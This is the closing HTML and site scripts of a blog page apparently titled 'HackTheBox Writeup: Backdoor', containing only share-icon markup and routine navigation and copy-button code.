222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Backdoor on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Backdoor&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_backdoor%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>